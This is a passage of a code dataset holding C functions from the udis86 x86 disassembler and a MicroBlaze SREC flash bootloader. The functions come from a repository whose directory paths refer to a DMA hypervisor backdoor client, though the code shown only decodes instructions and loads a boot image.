0x66, F3, and F2 prefixes */\n        if ( 0x66 == u->pfx_insn ) {\n        /* ssse3 & sse4 opcodes have form 66 0f [38 3a] */\n            if ( (curr == 0x38) || (curr == 0x3A) )\n            {\n              table = (curr == 0x38) ? ITAB__PFX_SSE66__SSE38 : ITAB__PFX_SSE66__SSE3A;\n              curr  = inp_next(u);\n              if ( u->error )\n                return -1;\n              u->pfx_opr = 0;\n            }\n            else if ( ud_itab_list[ ITAB__PFX_SSE66__0F ][ curr ].mnemonic != UD_Iinvalid ) {\n                table = ITAB__PFX_SSE66__0F;\n                u->pfx_opr = 0;\n            }\n        } else if ( 0xF2 == u->pfx_insn ) {\n            if ( curr == 0x38 )\n            {\n              table = ITAB__PFX_SSEF2__SSE38;\n              curr  = inp_next(u);\n              if ( u->error )\n                return -1;\n              u->pfx_repne = 0;\n            }\n            else if ( ud_itab_list[ ITAB__PFX_SSEF2__0F ][ curr ].mnemonic != UD_Iinvalid ) {\n                table = ITAB__PFX_SSEF2__0F; \n                u->pfx_repne = 0;\n            }\n        } else if ( 0xF3 == u->pfx_insn ) {\n            if ( ud_itab_list[ ITAB__PFX_SSEF3__0F ][ curr ].mnemonic != UD_Iinvalid ) {\n                table = ITAB__PFX_SSEF3__0F;\n                u->pfx_repe = 0;\n                u->pfx_rep  = 0;\n            }\n        } else if ( (curr == 0x38) || (curr == 0x3A) )\n        { /* 0f [38 3a] form for SSSE3 mostly */\n          table = (curr == 0x38) ? ITAB__PFX_SSE38 : ITAB__PFX_SSE3A;\n          curr  = inp_next(u);\n          if ( u->error )\n            return -1;\n        }\n    /* pick an instruction from the 1byte table */\n    } else {\n        table = ITAB__1BYTE; \n    }\n\n    index = curr;\n\nsearch:\n\n    e = & ud_itab_list[ table ][ index ];\n\n    /* if mnemonic constant is a standard instruction constant\n     * our search is over.\n     */\n    \n    if ( e->mnemonic < UD_Id3vil ) {\n        if ( e->mnemonic == UD_Iinvalid ) {\n            if ( did_peek ) {\n                inp_next( u ); if ( u->error ) return -1;\n            }\n            goto found_entry;\n        }\n        goto found_entry;\n    }\n\n    table = e->prefix;\n\n    switch ( e->mnemonic )\n    {\n    case UD_Igrp_reg:\n        peek     = inp_peek( u );\n        did_peek = 1;\n        index    = MODRM_REG( peek );\n        break;\n\n    case UD_Igrp_mod:\n        peek     = inp_peek( u );\n        did_peek = 1;\n        index    = MODRM_MOD( peek );\n        if ( index == 3 )\n           index = ITAB__MOD_INDX__11;\n        else \n           index = ITAB__MOD_INDX__NOT_11; \n        break;\n\n    case UD_Igrp_rm:\n        curr     = inp_next( u );\n        did_peek = 0;\n        if ( u->error )\n            return -1;\n        index    = MODRM_RM( curr );\n        break;\n\n    case UD_Igrp_x87:\n        curr     = inp_next( u );\n        did_peek = 0;\n        if ( u->error )\n            return -1;\n        index    = curr - 0xC0;\n        break;\n\n    case UD_Igrp_osize:\n        if ( u->opr_mode == 64 ) \n            index = ITAB__MODE_INDX__64;\n        else if ( u->opr_mode == 32 ) \n            index = ITAB__MODE_INDX__32;\n        else\n            index = ITAB__MODE_INDX__16;\n        break;\n \n    case UD_Igrp_asize:\n        if ( u->adr_mode == 64 ) \n            index = ITAB__MODE_INDX__64;\n        else if ( u->adr_mode == 32 ) \n            index = ITAB__MODE_INDX__32;\n        else\n            index = ITAB__MODE_INDX__16;\n        break;               \n\n    case UD_Igrp_mode:\n        if ( u->dis_mode == 64 ) \n            index = ITAB__MODE_INDX__64;\n        else if ( u->dis_mode == 32 ) \n            index = ITAB__MODE_INDX__32;\n        else\n            index = ITAB__MODE_INDX__16;\n        break;\n\n    case UD_Igrp_vendor:\n        if ( u->vendor == UD_VENDOR_INTEL ) \n            index = ITAB__VENDOR_INDX__INTEL; \n        else if ( u->vendor == UD_VENDOR_AMD )\n            index = ITAB__VENDOR_INDX__AMD;\n#ifndef __BUILDMACHINE__\n        else\n            assert( !\"unrecognized vendor id\" );\n#endif /* !__BUILDMACHINE__ */\n        break;\n\n    case UD_Id3vil:\n#ifndef __BUILDMACHINE__\n        assert( !\"invalid instruction mnemonic constant Id3vil\" );\n#endif /* !__BUILDMACHINE__ */\n        break;\n\n    default:\n#ifndef __BUILDMACHINE__\n        assert( !\"invalid instruction mnemonic constant\" );\n#endif /* !__BUILDMACHINE__ */\n        break;\n    }\n\n    goto search;\n\nfound_entry:\n\n    u->itab_entry = e;\n    u->mnemonic = u->itab_entry->mnemonic;\n\n    return 0;\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/decode.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* -----------------------------------------------------------------------------\n * resolve_reg() - Resolves the register type \n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static enum ud_type \nresolve_reg(struct ud* u, unsigned int type, unsigned char i)", "code": "{\n  switch (type) {\n    case T_MMX :    return UD_R_MM0  + (i & 7);\n    case T_XMM :    return UD_R_XMM0 + i;\n    case T_CRG :    return UD_R_CR0  + i;\n    case T_DBG :    return UD_R_DR0  + i;\n    case T_SEG :    return UD_R_ES   + (i & 7);\n    case T_NONE:\n    default:    return UD_NONE;\n  }\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/decode.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* =============================================================================\n * ud_set_mode() - Set Disassemly Mode.\n * =============================================================================\n */\n", "func_signal": "extern void __stdcall\nud_set_mode(struct ud* u, uint8_t m)", "code": "{\n  switch(m) {\n\tcase 16:\n\tcase 32:\n\tcase 64: u->dis_mode = m ; return;\n\tdefault: u->dis_mode = 16; return;\n  }\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/udis86.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* =============================================================================\n * ud_init() - Initializes ud_t object.\n * =============================================================================\n */\n", "func_signal": "extern void __stdcall\nud_init(struct ud* u)", "code": "{\n  __stosb((void*)u, 0, sizeof(struct ud));\n  ud_set_mode(u, 16);\n  u->mnemonic = UD_Iinvalid;\n  ud_set_pc(u, 0);\n#ifndef __UD_STANDALONE__\n  ud_set_input_file(u, stdin);\n#endif /* __UD_STANDALONE__ */\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/udis86.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "// __MICROBLAZE__\n", "func_signal": "int main()", "code": "{\n    uint8_t ret;\n\n    init_stdout();    \n\n    /* Turn on the LEDs */\n    led_on_off(0xffffffff);\n\n    /* Check if push button is pressed */\n    if (gpio_read() != 0)\n    {        \n        /* Go to the flash update mode */\n        if (flash_mode() != 0)\n        {\n\n#ifdef VERBOSE\n\n            print(\"ERROR: flash_mode() fails\\n\");\n#endif\n            return 0;\n        }        \n    }\n\n#ifdef VERBOSE    \n\n    print(\"\\nSREC Bootloader\\n\");\n    print(\"Loading SREC image from flash at address: \");    \n    putnum(FLASH_IMAGE_BASEADDR);\n    print(\"\\n\");\n\n#endif // VERBOSE\n\n    /* Load SREC image from flash */\n    fl_buff_ptr = (uint8_t *)(FLASH_IMAGE_BASEADDR + FLASH_IMAGE_START);\n    ret = load_exec();\n\n    /* If we reach here, we are in error */\n    \n#ifdef VERBOSE\n\n    print(\"ERROR in SREC line \");\n    putnum(srec_line);\n    print(\"\\n\");\n\n    print(errors[ret]);\n\n#endif // VERBOSE\n\n    return ret;\n}", "path": "s6_pcie_microblaze/sdk/srec_bootloader_0/src/bootloader.c", "commit_date": "2019-12-06 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* =============================================================================\n * ud_set_vendor() - Set vendor.\n * =============================================================================\n */\n", "func_signal": "extern void __stdcall\nud_set_vendor(struct ud* u, unsigned v)", "code": "{\n  switch(v) {\n\tcase UD_VENDOR_INTEL:\n\t\tu->vendor = (uint8_t)v;\n\t\tbreak;\n\tdefault:\n\t\tu->vendor = UD_VENDOR_AMD;\n  }\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/udis86.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* -----------------------------------------------------------------------------\n * decode_a()- Decodes operands of the type seg:offset\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static void \ndecode_a(struct ud* u, struct ud_operand *op)", "code": "{\n  if (u->opr_mode == 16) {  \n    /* seg16:off16 */\n    op->type = UD_OP_PTR;\n    op->size = 32;\n    op->lval.ptr.off = inp_uint16(u);\n    op->lval.ptr.seg = inp_uint16(u);\n  } else {\n    /* seg16:off32 */\n    op->type = UD_OP_PTR;\n    op->size = 48;\n    op->lval.ptr.off = inp_uint32(u);\n    op->lval.ptr.seg = inp_uint16(u);\n  }\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/decode.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* -----------------------------------------------------------------------------\n * decode_gpr() - Returns decoded General Purpose Register \n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static enum ud_type \ndecode_gpr(register struct ud* u, uint8_t s, unsigned char rm)", "code": "{\n  s = resolve_operand_size(u, s);\n        \n  switch (s) {\n    case 64:\n        return UD_R_RAX + rm;\n    case SZ_DP:\n    case 32:\n        return UD_R_EAX + rm;\n    case SZ_WP:\n    case 16:\n        return UD_R_AX  + rm;\n    case  8:\n        if (u->dis_mode == 64 && u->pfx_rex) {\n            if (rm >= 4)\n                return UD_R_SPL + (rm-4);\n            return UD_R_AL + rm;\n        } else return UD_R_AL + rm;\n    default:\n        return 0;\n  }\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/decode.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* -----------------------------------------------------------------------------\n * disasm_operands() - Disassembles Operands.\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static int disasm_operands(register struct ud* u)", "code": "{\n\n\n  /* mopXt = map entry, operand X, type; */\n  enum ud_operand_code mop1t = u->itab_entry->operand1.type;\n  enum ud_operand_code mop2t = u->itab_entry->operand2.type;\n  enum ud_operand_code mop3t = u->itab_entry->operand3.type;\n\n  /* mopXs = map entry, operand X, size */\n  uint8_t mop1s = u->itab_entry->operand1.size;\n  uint8_t mop2s = u->itab_entry->operand2.size;\n  uint8_t mop3s = u->itab_entry->operand3.size;\n\n  /* iop = instruction operand */\n  register struct ud_operand* iop = u->operand;\n    \n  switch(mop1t) {\n    \n    case OP_A :\n        decode_a(u, &(iop[0]));\n        break;\n    \n    /* M[b] ... */\n    case OP_M :\n        if (MODRM_MOD(inp_peek(u)) == 3)\n            u->error= 1;\n    /* E, G/P/V/I/CL/1/S */\n    case OP_E :\n        if (mop2t == OP_G) {\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, &(iop[1]), mop2s, T_GPR);\n            if (mop3t == OP_I)\n                decode_imm(u, mop3s, &(iop[2]));\n            else if (mop3t == OP_CL) {\n                iop[2].type = UD_OP_REG;\n                iop[2].base = UD_R_CL;\n                iop[2].size = 8;\n            }\n        }\n        else if (mop2t == OP_P)\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, &(iop[1]), mop2s, T_MMX);\n        else if (mop2t == OP_V)\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, &(iop[1]), mop2s, T_XMM);\n        else if (mop2t == OP_S)\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, &(iop[1]), mop2s, T_SEG);\n        else {\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, NULL, 0, T_NONE);\n            if (mop2t == OP_CL) {\n                iop[1].type = UD_OP_REG;\n                iop[1].base = UD_R_CL;\n                iop[1].size = 8;\n            } else if (mop2t == OP_I1) {\n                iop[1].type = UD_OP_CONST;\n                u->operand[1].lval.udword = 1;\n            } else if (mop2t == OP_I) {\n                decode_imm(u, mop2s, &(iop[1]));\n            }\n        }\n        break;\n\n    /* G, E/PR[,I]/VR */\n    case OP_G :\n        if (mop2t == OP_M) {\n            if (MODRM_MOD(inp_peek(u)) == 3)\n                u->error= 1;\n            decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_GPR);\n        } else if (mop2t == OP_E) {\n            decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_GPR);\n            if (mop3t == OP_I)\n                decode_imm(u, mop3s, &(iop[2]));\n        } else if (mop2t == OP_PR) {\n            decode_modrm(u, &(iop[1]), mop2s, T_MMX, &(iop[0]), mop1s, T_GPR);\n            if (mop3t == OP_I)\n                decode_imm(u, mop3s, &(iop[2]));\n        } else if (mop2t == OP_VR) {\n            if (MODRM_MOD(inp_peek(u)) != 3)\n                u->error = 1;\n            decode_modrm(u, &(iop[1]), mop2s, T_XMM, &(iop[0]), mop1s, T_GPR);\n        } else if (mop2t == OP_W)\n            decode_modrm(u, &(iop[1]), mop2s, T_XMM, &(iop[0]), mop1s, T_GPR);\n        break;\n\n    /* AL..BH, I/O/DX */\n    case OP_AL : case OP_CL : case OP_DL : case OP_BL :\n    case OP_AH : case OP_CH : case OP_DH : case OP_BH :\n\n        iop[0].type = UD_OP_REG;\n        iop[0].base = UD_R_AL + (mop1t - OP_AL);\n        iop[0].size = 8;\n\n        if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        else if (mop2t == OP_DX) {\n            iop[1].type = UD_OP_REG;\n            iop[1].base = UD_R_DX;\n            iop[1].size = 16;\n        }\n        else if (mop2t == OP_O)\n            decode_o(u, mop2s, &(iop[1]));\n        break;\n\n    /* rAX[r8]..rDI[r15], I/rAX..rDI/O */\n    case OP_rAXr8 : case OP_rCXr9 : case OP_rDXr10 : case OP_rBXr11 :\n    case OP_rSPr12: case OP_rBPr13: case OP_rSIr14 : case OP_rDIr15 :\n    case OP_rAX : case OP_rCX : case OP_rDX : case OP_rBX :\n    case OP_rSP : case OP_rBP : case OP_rSI : case OP_rDI :\n\n        iop[0].type = UD_OP_REG;\n        iop[0].base = resolve_gpr64(u, mop1t);\n\n        if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        else if (mop2t >= OP_rAX && mop2t <= OP_rDI) {\n            iop[1].type = UD_OP_REG;\n            iop[1].base = resolve_gpr64(u, mop2t);\n        }\n        else if (mop2t == OP_O) {\n            decode_o(u, mop2s, &(iop[1]));  \n            iop[0].size = resolve_operand_size(u, mop2s);\n        }\n        break;\n\n    /* AL[r8b]..BH[r15b], I */\n    case OP_ALr8b : case OP_CLr9b : case OP_DLr10b : case OP_BLr11b :\n    case OP_AHr12b: case OP_CHr13b: case OP_DHr14b : case OP_BHr15b :\n    {\n        ud_type_t gpr = (mop1t - OP_ALr8b) + UD_R_AL + \n                        (REX_B(u->pfx_rex) << 3);\n        if (UD_R_AH <= gpr && u->pfx_rex)\n            gpr = gpr + 4;\n        iop[0].type = UD_OP_REG;\n        iop[0].base = gpr;\n        if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        break;\n    }\n\n    /* eAX..eDX, DX/I */\n    case OP_eAX : case OP_eCX : case OP_eDX : case OP_eBX :\n    case OP_eSP : case OP_eBP : case OP_eSI : case OP_eDI :\n        iop[0].type = UD_OP_REG;\n        iop[0].base = resolve_gpr32(u, mop1t);\n        if (mop2t == OP_DX) {\n            iop[1].type = UD_OP_REG;\n            iop[1].base = UD_R_DX;\n            iop[1].size = 16;\n        } else if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        break;\n\n    /* ES..GS */\n    case OP_ES : case OP_CS : case OP_DS :\n    case OP_SS : case OP_FS : case OP_GS :\n\n        /* in 64bits mode, only fs and gs are allowed */\n        if (u->dis_mode == 64)\n            if (mop1t != OP_FS && mop1t != OP_GS)\n                u->error= 1;\n        iop[0].type = UD_OP_REG;\n        iop[0].base = (mop1t - OP_ES) + UD_R_ES;\n        iop[0].size = 16;\n\n        break;\n\n    /* J */\n    case OP_J :\n        decode_imm(u, mop1s, &(iop[0]));        \n        iop[0].type = UD_OP_JIMM;\n        break ;\n\n    /* PR, I */\n    case OP_PR:\n        if (MODRM_MOD(inp_peek(u)) != 3)\n            u->error = 1;\n        decode_modrm(u, &(iop[0]), mop1s, T_MMX, NULL, 0, T_NONE);\n        if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        break; \n\n    /* VR, I */\n    case OP_VR:\n        if (MODRM_MOD(inp_peek(u)) != 3)\n            u->error = 1;\n        decode_modrm(u, &(iop[0]), mop1s, T_XMM, NULL, 0, T_NONE);\n        if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        break; \n\n    /* P, Q[,I]/W/E[,I],VR */\n    case OP_P :\n        if (mop2t == OP_Q) {\n            decode_modrm(u, &(iop[1]), mop2s, T_MMX, &(iop[0]), mop1s, T_MMX);\n            if (mop3t == OP_I)\n                decode_imm(u, mop3s, &(iop[2]));\n        } else if (mop2t == OP_W) {\n            decode_modrm(u, &(iop[1]), mop2s, T_XMM, &(iop[0]), mop1s, T_MMX);\n        } else if (mop2t == OP_VR) {\n            if (MODRM_MOD(inp_peek(u)) != 3)\n                u->error = 1;\n            decode_modrm(u, &(iop[1]), mop2s, T_XMM, &(iop[0]), mop1s, T_MMX);\n        } else if (mop2t == OP_E) {\n            decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_MMX);\n            if (mop3t == OP_I)\n                decode_imm(u, mop3s, &(iop[2]));\n        }\n        break;\n\n    /* R, C/D */\n    case OP_R :\n        if (mop2t == OP_C)\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, &(iop[1]), mop2s, T_CRG);\n        else if (mop2t == OP_D)\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, &(iop[1]), mop2s, T_DBG);\n        break;\n\n    /* C, R */\n    case OP_C :\n        decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_CRG);\n        break;\n\n    /* D, R */\n    case OP_D :\n        decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_DBG);\n        break;\n\n    /* Q, P */\n    case OP_Q :\n        decode_modrm(u, &(iop[0]), mop1s, T_MMX, &(iop[1]), mop2s, T_MMX);\n        break;\n\n    /* S, E */\n    case OP_S :\n        decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_SEG);\n        break;\n\n    /* W, V */\n    case OP_W :\n        decode_modrm(u, &(iop[0]), mop1s, T_XMM, &(iop[1]), mop2s, T_XMM);\n        break;\n\n    /* V, W[,I]/Q/M/E */\n    case OP_V :\n        if (mop2t == OP_W) {\n            /* special cases for movlps and movhps */\n            if (MODRM_MOD(inp_peek(u)) == 3) {\n                if (u->mnemonic == UD_Imovlps)\n                    u->mnemonic = UD_Imovhlps;\n                else\n                if (u->mnemonic == UD_Imovhps)\n                    u->mnemonic = UD_Imovlhps;\n            }\n            decode_modrm(u, &(iop[1]), mop2s, T_XMM, &(iop[0]), mop1s, T_XMM);\n            if (mop3t == OP_I)\n                decode_imm(u, mop3s, &(iop[2]));\n        } else if (mop2t == OP_Q)\n            decode_modrm(u, &(iop[1]), mop2s, T_MMX, &(iop[0]), mop1s, T_XMM);\n        else if (mop2t == OP_M) {\n            if (MODRM_MOD(inp_peek(u)) == 3)\n                u->error= 1;\n            decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_XMM);\n        } else if (mop2t == OP_E) {\n            decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_XMM);\n        } else if (mop2t == OP_PR) {\n            decode_modrm(u, &(iop[1]), mop2s, T_MMX, &(iop[0]), mop1s, T_XMM);\n        }\n        break;\n\n    /* DX, eAX/AL */\n    case OP_DX :\n        iop[0].type = UD_OP_REG;\n        iop[0].base = UD_R_DX;\n        iop[0].size = 16;\n\n        if (mop2t == OP_eAX) {\n            iop[1].type = UD_OP_REG;    \n            iop[1].base = resolve_gpr32(u, mop2t);\n        } else if (mop2t == OP_AL) {\n            iop[1].type = UD_OP_REG;\n            iop[1].base = UD_R_AL;\n            iop[1].size = 8;\n        }\n\n        break;\n\n    /* I, I/AL/eAX */\n    case OP_I :\n        decode_imm(u, mop1s, &(iop[0]));\n        if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        else if (mop2t == OP_AL) {\n            iop[1].type = UD_OP_REG;\n            iop[1].base = UD_R_AL;\n            iop[1].size = 16;\n        } else if (mop2t == OP_eAX) {\n            iop[1].type = UD_OP_REG;    \n            iop[1].base = resolve_gpr32(u, mop2t);\n        }\n        break;\n\n    /* O, AL/eAX */\n    case OP_O :\n        decode_o(u, mop1s, &(iop[0]));\n        iop[1].type = UD_OP_REG;\n        iop[1].size = resolve_operand_size(u, mop1s);\n        if (mop2t == OP_AL)\n            iop[1].base = UD_R_AL;\n        else if (mop2t == OP_eAX)\n            iop[1].base = resolve_gpr32(u, mop2t);\n        else if (mop2t == OP_rAX)\n            iop[1].base = resolve_gpr64(u, mop2t);      \n        break;\n\n    /* 3 */\n    case OP_I3 :\n        iop[0].type = UD_OP_CONST;\n        iop[0].lval.sbyte = 3;\n        break;\n\n    /* ST(n), ST(n) */\n    case OP_ST0 : case OP_ST1 : case OP_ST2 : case OP_ST3 :\n    case OP_ST4 : case OP_ST5 : case OP_ST6 : case OP_ST7 :\n\n        iop[0].type = UD_OP_REG;\n        iop[0].base = (mop1t-OP_ST0) + UD_R_ST0;\n        iop[0].size = 0;\n\n        if (mop2t >= OP_ST0 && mop2t <= OP_ST7) {\n            iop[1].type = UD_OP_REG;\n            iop[1].base = (mop2t-OP_ST0) + UD_R_ST0;\n            iop[1].size = 0;\n        }\n        break;\n\n    /* AX */\n    case OP_AX:\n        iop[0].type = UD_OP_REG;\n        iop[0].base = UD_R_AX;\n        iop[0].size = 16;\n        break;\n\n    /* none */\n    default :\n        iop[0].type = iop[1].type = iop[2].type = UD_NONE;\n  }\n\n  return 0;\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/decode.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* =============================================================================\n * ud_decode() - Instruction decoder. Returns the number of bytes decoded.\n * =============================================================================\n */\n", "func_signal": "unsigned int __stdcall ud_decode( struct ud* u )", "code": "{\n  inp_start(u);\n\n  if ( clear_insn( u ) ) {\n    ; /* error */\n  } else if ( get_prefixes( u ) != 0 ) {\n    ; /* error */\n  } else if ( search_itab( u ) != 0 ) {\n    ; /* error */\n  } else if ( do_mode( u ) != 0 ) {\n    ; /* error */\n  } else if ( disasm_operands( u ) != 0 ) {\n    ; /* error */\n  } else if ( resolve_mnemonic( u ) != 0 ) {\n    ; /* error */\n  }\n\n  /* Handle decode error. */\n  if ( u->error ) {\n    /* clear out the decode data. */\n    clear_insn( u );\n    /* mark the sequence of bytes as invalid. */\n    u->itab_entry = & ie_invalid;\n    u->mnemonic = u->itab_entry->mnemonic;\n  } \n\n  u->insn_offset = u->pc; /* set offset of instruction */\n  u->insn_fill = 0;   /* set translation buffer index to 0 */\n  u->pc += u->inp_ctr;    /* move program counter by bytes decoded */\n#ifndef __BUILDMACHINE__\n  gen_hex( u );       /* generate hex code */\n#endif /* !__BUILDMACHINE__ */\n\n  /* return number of bytes disassembled. */\n  return u->inp_ctr;\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/decode.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* -----------------------------------------------------------------------------\n * clear_insn() - clear instruction pointer \n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static int clear_insn(register struct ud* u)", "code": "{\n  u->error     = 0;\n  u->pfx_seg   = 0;\n  u->pfx_opr   = 0;\n  u->pfx_adr   = 0;\n  u->pfx_lock  = 0;\n  u->pfx_repne = 0;\n  u->pfx_rep   = 0;\n  u->pfx_repe  = 0;\n  u->pfx_seg   = 0;\n  u->pfx_rex   = 0;\n  u->pfx_insn  = 0;\n  u->mnemonic  = UD_Inone;\n  u->itab_entry = NULL;\n\n  __stosb(&u->operand[0], 0, sizeof(struct ud_operand));\n  __stosb(&u->operand[1], 0, sizeof(struct ud_operand));\n  __stosb(&u->operand[2], 0, sizeof(struct ud_operand));\n \n  return 0;\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/decode.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* -----------------------------------------------------------------------------\n * decode_imm() - Decodes Immediate values.\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static void \ndecode_imm(struct ud* u, uint8_t s, struct ud_operand *op)", "code": "{\n  op->size = resolve_operand_size(u, s);\n  op->type = UD_OP_IMM;\n\n  switch (op->size) {\n    case  8: op->lval.sbyte = inp_uint8(u);   break;\n    case 16: op->lval.uword = inp_uint16(u);  break;\n    case 32: op->lval.udword = inp_uint32(u); break;\n    case 64: op->lval.uqword = inp_uint64(u); break;\n    default: return;\n  }\n}", "path": "s6_pcie_microblaze/python/payloads/DmaBackdoorHv/backdoor_client/udis86/decode.c", "commit_date": "2020-04-19 00:00:00", "repo_name": "Cr4sh/s6_pcie_microblaze", "stars": 671, "license": "None", "language": "c", "size": 39384}
{"docstring": "/* -----------------------------------------------------------------------------\n * decode_modrm() - Decodes ModRM Byte\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static void \ndecode_modrm(struct ud* u, struct ud_operand *op, uint8_t s, \n         unsigned char rm_type, struct ud_operand *opreg, \n         unsigned char reg_size, unsigned char reg_type)", "code": "{\n  unsigned char mod, rm, reg;\n\n  inp_next(u);\n\n  /* get mod, r/m and reg fields */\n  mod = MODRM_MOD(inp_curr(u));\n  rm  = (REX_B(u->pfx_rex) << 3) | MODRM_RM(inp_curr(u));\n  reg = (REX_R(u->pfx_rex) << 3) | MODRM_REG(inp_curr(u));\n\n  op->size = resolve_operand_size(u, s);\n\n  /* if mod is 11b, then the UD_R_m specifies a gpr/mmx/sse/control/debug */\n  if (mod == 3) {\n    op->type = UD_OP_REG;\n    if (rm_type ==  T_GPR)\n        op->base = decode_gpr(u, op->size, rm);\n    else    op->base = resolve_reg(u, rm_type, (REX_B(u->pfx_rex) << 3) | (rm&7));\n  } \n  /* else its memory addressing */  \n  else {\n    op->type = UD_OP_MEM;\n\n    /* 64bit addressing */\n    if (u->adr_mode == 64) {\n\n        op->base = UD_R_RAX + rm;\n\n        /* get offset type */\n        if (mod == 1)\n            op->offset = 8;\n        else if (mod == 2)\n            op->offset = 32;\n        else if (mod == 0 && (rm & 7) == 5) {           \n            op->base = UD_R_RIP;\n            op->offset = 32;\n        } else  op->offset = 0;\n\n        /* Scale-Index-Base (SIB) */\n        if ((rm & 7) == 4) {\n            inp_next(u);\n            \n            op->scale = (1 << SIB_S(inp_curr(u))) & ~1;\n            op->index = UD_R_RAX + (SIB_I(inp_curr(u)) | (REX_X(u->pfx_rex) << 3));\n            op->base  = UD_R_RAX + (SIB_B(inp_curr(u)) | (REX_B(u->pfx_rex) << 3));\n\n            /* special conditions for base reference */\n            if (op->index == UD_R_RSP) {\n                op->index = UD_NONE;\n                op->scale = UD_NONE;\n            }\n\n            if (op->base == UD_R_RBP || op->base == UD_R_R13) {\n                if (mod == 0) \n                    op->base = UD_NONE;\n                if (mod == 1)\n                    op->offset = 8;\n                else op->offset = 32;\n            }\n        }\n    } \n\n    /* 32-Bit addressing mode */\n    else if (u->adr_mode == 32) {\n\n        /* get base */\n        op->base = UD_R_EAX + rm;\n\n        /* get offset type */\n        if (mod == 1)\n            op->offset = 8;\n        else if (mod == 2)\n            op->offset = 32;\n        else if (mod == 0 && rm == 5) {\n            op->base = UD_NONE;\n            op->offset = 32;\n        } else  op->offset = 0;\n\n        /* Scale-Index-Base (SIB) */\n        if ((rm & 7) == 4) {\n            inp_next(u);\n\n            op->scale = (1 << SIB_S(inp_curr(u))) & ~1;\n            op->index = UD_R_EAX + (SIB_I(inp_curr(u)) | (REX_X(u->pfx_rex) << 3));\n            op->base  = UD_R_EAX + (SIB_B(inp_curr(u)) | (REX_B(u->pfx_rex) << 3));\n\n            if (op->index == UD_R_ESP) {\n                op->index = UD_NONE;\n                op->scale = UD_NONE;\n            }\n\n            /* special condition for base reference */\n            if (op->base == UD_R_EBP) {\n                if (mod == 0)\n                    op->base = UD_NONE;\n                if (mod == 1)\n                    op->offset = 8;\n                else op->offset = 32;\n            }\n        }\n    } \n\n    /* 16bit addressing mode */\n    else  {\n        switch (rm) {\n            case 0: op->base = UD_R_BX; op->index = UD_R_SI; break;\n            case 1: op->base = 